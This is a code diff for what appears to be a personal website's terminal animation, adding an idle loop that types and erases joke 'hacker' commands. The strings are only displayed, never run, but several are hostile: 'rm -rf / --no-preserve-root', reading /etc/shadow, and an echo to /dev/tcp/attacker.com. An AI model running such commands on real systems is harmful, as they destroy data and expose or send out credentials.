@@ -99,6 +99,25 @@ const isTyping = ref(false);
 const isDone = ref(false);
 const skipped = ref(false);
 
+const idleCommands = [
+  "ping 127.0.0.1 -c 9999",
+  "nmap -Pn -sV secret-door.ilovebees.com",
+  "sudo cat /etc/shadow > /dev/null",
+  "curl -s https://api.hackernews.com/flags | jq .",
+  "rm -rf / --no-preserve-root",
+  "telnet towel.blinkenlights.nl",
+  "ssh admin@deathstar",
+  "git clone --depth=1 https://github.com/adamstirtan/adamstirtan.net.git",
+  "ls -la /var/www/secret",
+  "java -jar hacktheplanet.jar --target all --stealth-mode",
+  "echo 'I am root' > /dev/tcp/attacker.com/1337",
+  "find / -type f -name 'passwords.txt' 2> /dev/null",
+  "openssl s_client -connect secret-door.ilovebees.com:443",
+  "export PATH=$PATH:/secret/hacker/tools && hacktheplanet --stealth",
+];
+
+let idleTimer: ReturnType<typeof setTimeout> | null = null;
+
 // ── Glitch state ────────────────────────────────────────────────────────────
 const glitchActive = ref(false);
 const glitchHeavy = ref(false);
@@ -130,6 +149,56 @@ function scheduleGlitch() {
   glitchTimer = setTimeout(doGlitch, 3500 + Math.random() * 8500);
 }
 
+function stopIdleLoop() {
+  if (idleTimer) {
+    clearTimeout(idleTimer);
+    idleTimer = null;
+  }
+}
+
+function scheduleIdleCycle() {
+  stopIdleLoop();
+  idleTimer = setTimeout(runIdleCycle, 5000 + Math.random() * 5000);
+}
+
+function runIdleCycle() {
+  // Pick a friendly, funny "hacker" command to type.
+  const command = idleCommands[Math.floor(Math.random() * idleCommands.length)];
+  currentType.value = "command";
+  currentHref.value = undefined;
+  currentText.value = "";
+  isTyping.value = true;
+  isDone.value = false;
+
+  const typeSpeed = 70;
+  let charIdx = 0;
+
+  function typeChar() {
+    if (skipped.value) return;
+    if (charIdx < command.length) {
+      currentText.value = command.slice(0, ++charIdx);
+      later(typeChar, typeSpeed + Math.random() * 40 - 20);
+    } else {
+      // Pause briefly before clearing the line.
+      later(deleteChar, 1200 + Math.random() * 1200);
+    }
+  }
+
+  function deleteChar() {
+    if (skipped.value) return;
+    if (currentText.value.length > 0) {
+      currentText.value = currentText.value.slice(0, -1);
+      later(deleteChar, typeSpeed * 0.65 + Math.random() * 30);
+    } else {
+      isTyping.value = false;
+      isDone.value = true;
+      scheduleIdleCycle();
+    }
+  }
+
+  typeChar();
+}
+
 let timeoutIds: ReturnType<typeof setTimeout>[] = [];
 
 function later(fn: () => void, delay: number) {
@@ -147,6 +216,7 @@ function processLine(index: number) {
   if (index >= lineConfigs.length) {
     isTyping.value = false;
     isDone.value = true;
+    scheduleIdleCycle();
     return;
   }
 
@@ -203,6 +273,8 @@ function skipToEnd() {
   currentText.value = "";
   isTyping.value = false;
   isDone.value = true;
+  skipped.value = false; // allow idle typing to continue
+  scheduleIdleCycle();
 }
 
 watch(
@@ -222,6 +294,7 @@ onMounted(() => {
 
 onUnmounted(() => {
   clearAll();
+  stopIdleLoop();
   if (glitchTimer) clearTimeout(glitchTimer);
   window.removeEventListener("keydown", skipToEnd);
 });
